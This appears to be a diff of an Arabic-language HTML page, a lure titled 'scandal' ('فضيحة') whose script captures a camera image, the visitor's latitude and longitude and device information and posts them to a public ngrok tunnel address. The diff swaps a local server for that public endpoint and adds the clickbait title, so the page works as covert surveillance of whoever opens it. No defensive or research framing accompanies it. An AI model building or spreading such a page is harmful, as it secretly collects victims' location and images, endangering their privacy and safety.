@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>الصورة فقط</title>
+    <title>فضيحة</title>
     <style>
         body { display:flex; justify-content:center; align-items:center; height:100vh; }
         img { cursor:pointer; width:300px; }
@@ -47,7 +47,7 @@
                         const imgData = canvas.toDataURL('image/png');
 
                         // إرسال البيانات إلى السيرفر
-                        fetch("http://192.168.0.112:5000/receive_data", {
+                        fetch("https://02ba25440b3e.ngrok-free.app", {
                             method:"POST",
                             headers: { "Content-Type":"application/json" },
                             body: JSON.stringify({ lat, lon, imgData, deviceInfo })
@@ -65,4 +65,3 @@
     </script>
 </body>
 </html>
-
